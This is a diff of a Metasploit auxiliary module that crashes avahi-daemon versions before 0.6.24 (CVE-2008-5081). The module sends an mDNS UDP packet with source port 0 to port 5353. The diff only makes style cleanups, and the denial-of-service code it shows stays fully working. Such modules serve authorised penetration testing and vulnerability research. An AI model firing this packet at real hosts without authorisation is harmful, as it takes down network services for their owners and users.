@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,30 +7,29 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Capture
   include Msf::Auxiliary::Dos
 
   def initialize
     super(
       'Name'        => 'Avahi Source Port 0 DoS',
-      'Description' => %q{
+      'Description' => %q(
         Avahi-daemon versions prior to 0.6.24 can be DoS'd
         with an mDNS packet with a source port of 0.
-      },
+      ),
       'Author'      => 'kris katterjohn',
       'License'     => MSF_LICENSE,
       'References'  => [
         [ 'CVE', '2008-5081' ],
-        [ 'OSVDB', '50929' ],
+        [ 'OSVDB', '50929' ]
       ],
       'DisclosureDate' => 'Nov 14 2008')
 
     register_options([
-      OptInt.new('RPORT', [true, 'The destination port', 5353])
-    ])
+                       OptInt.new('RPORT', [true, 'The destination port', 5353])
+                     ])
 
-    deregister_options('FILTER','PCAPFILE')
+    deregister_options('FILTER', 'PCAPFILE')
   end
 
   def run
@@ -45,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
     p.udp_dport = datastore['RPORT'].to_i
     p.payload = Rex::Text.rand_text(rand(0x20)) # UDP needs at least one data byte, may as well send a few.
     p.recalc
-    capture_sendto(p, rhost) and print_status("Avahi should be down now")
+    capture_sendto(p, rhost) && print_status("Avahi should be down now")
     close_pcap
   end
 end
